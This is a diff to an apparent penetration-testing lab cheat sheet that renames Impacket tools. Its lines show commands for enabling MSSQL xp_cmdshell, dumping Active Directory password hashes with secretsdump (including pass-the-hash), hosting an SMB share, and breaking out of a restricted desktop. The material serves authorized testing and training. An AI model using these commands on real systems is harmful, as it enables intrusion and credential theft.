@@ -536,26 +536,26 @@ MSSQL access can lead to OS command execution if permissions allow `xp_cmdshell`
 ## Connect with Impacket
 
 ```bash
-mssqlclient.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -windows-auth
+impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -windows-auth
 ```
 
 Local account example:
 
 ```bash
-mssqlclient.py <USERNAME>:<PASSWORD>@<TARGET_IP>
+impacket-mssqlclient <USERNAME>:<PASSWORD>@<TARGET_IP>
 ```
 
 Windows authentication example:
 
 ```bash
-mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
+impacket-mssqlclient <USERNAME>@<TARGET_IP> -windows-auth
 ```
 
 ---
 
 ## Enable xp_cmdshell
 
-Inside `mssqlclient.py`:
+Inside `impacket-mssqlclient`:
 
 ```sql
 enable_xp_cmdshell
@@ -967,28 +967,28 @@ Notes:
 
 ---
 
-## Extract Hashes with secretsdump.py
+## Extract Hashes with impacket-secretsdump
 
 ```bash
-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 With hashes:
 
 ```bash
-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes <LM_HASH>:<NT_HASH> LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes <LM_HASH>:<NT_HASH> LOCAL
 ```
 
 Remote example:
 
 ```bash
-secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 ```
 
 Pass-the-hash example:
 
 ```bash
-secretsdump.py -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USERNAME>@<TARGET_IP>
+impacket-secretsdump -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USERNAME>@<TARGET_IP>
 ```
 
 ---
@@ -1803,7 +1803,7 @@ A file dialog may also be able to browse a remote SMB share when normal File Exp
 On the **Linux assessment host**, serve the current working directory using Impacket:
 
 ```bash
-smbserver.py -smb2support share "$(pwd)"
+impacket-smbserver -smb2support share "$(pwd)"
 ```
 
 In the restricted desktop, open **Paint → File → Open**, change the filter to **All Files**, and supply the lab's SMB UNC path:
@@ -1961,7 +1961,7 @@ Confirm elevated group/token information and whether previously denied operation
 | Objective | Technique / Command |
 |---|---|
 | Reach a blocked path | Paint → File → Open → **All Files** → `\\127.0.0.1\c$\users\pmorgan` |
-| Host a lab SMB share | `smbserver.py -smb2support share "$(pwd)"` |
+| Host a lab SMB share | `impacket-smbserver -smb2support share "$(pwd)"` |
 | Browse remote SMB from dialog | `\\10.13.38.95\share` |
 | Launch a shell through a shortcut | Set `.lnk` Target to `C:\Windows\System32\cmd.exe` |
 | Test batch-file execution | `.bat` file containing `cmd` |
